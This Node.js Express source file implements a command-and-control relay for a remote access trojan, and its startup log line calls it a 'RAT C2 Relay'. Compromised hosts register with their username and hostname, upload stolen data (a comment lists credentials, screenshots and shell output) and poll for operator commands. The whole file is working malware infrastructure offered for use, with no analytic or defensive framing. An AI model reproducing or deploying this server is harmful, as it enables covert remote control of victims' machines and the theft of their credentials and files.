const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));

// In-memory storage
const agents = new Map();
const responses = new Map(); // agent_id -> [responses]

// Health check
app.get('/', (req, res) => {
    res.json({ status: 'ok', agents: agents.size });
});

// Agent registration
app.post('/api/register', (req, res) => {
    const info = req.body;
    const id = info.id || uuidv4();
    agents.set(id, { ...info, id, last_seen: new Date().toISOString() });
    console.log(`[REGISTER] ${info.username}@${info.hostname} (${id})`);
    res.json({ success: true, id });
});

// Agent sends data (credentials, screenshot, shell result, etc.)
app.post('/api/data/:agentId', (req, res) => {
    const { agentId } = req.params;
    const data = req.body;

    if (!responses.has(agentId)) {
        responses.set(agentId, []);
    }

    const agentResponses = responses.get(agentId);
    agentResponses.push({
        ...data,
        timestamp: new Date().toISOString()
    });

    // Keep last 100 responses per agent
    if (agentResponses.length > 100) {
        agentResponses.shift();
    }

    // Update last seen
    if (agents.has(agentId)) {
        agents.get(agentId).last_seen = new Date().toISOString();
    }

    console.log(`[DATA] ${data.type} from ${agentId}`);
    res.json({ success: true });
});

// Admin fetches all data for an agent
app.get('/api/data/:agentId', (req, res) => {
    const { agentId } = req.params;
    const data = responses.get(agentId) || [];
    res.json(data);
});

// Admin fetches all agents
app.get('/api/agents', (req, res) => {
    const list = Array.from(agents.values());
    res.json(list);
});

// Admin sends command to agent
app.post('/api/command/:agentId', (req, res) => {
    const { agentId } = req.params;
    const cmd = req.body;
    // Store command for agent to pick up
    if (!responses.has(`cmd_${agentId}`)) {
        responses.set(`cmd_${agentId}`, []);
    }
    responses.get(`cmd_${agentId}`).push({
        ...cmd,
        timestamp: new Date().toISOString()
    });
    res.json({ success: true });
});

// Agent polls for commands
app.get('/api/commands/:agentId', (req, res) => {
    const { agentId } = req.params;
    const cmds = responses.get(`cmd_${agentId}`) || [];
    responses.set(`cmd_${agentId}`, []); // Clear after fetching
    res.json(cmds);
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
    console.log(`RAT C2 Relay listening on port ${PORT}`);
});
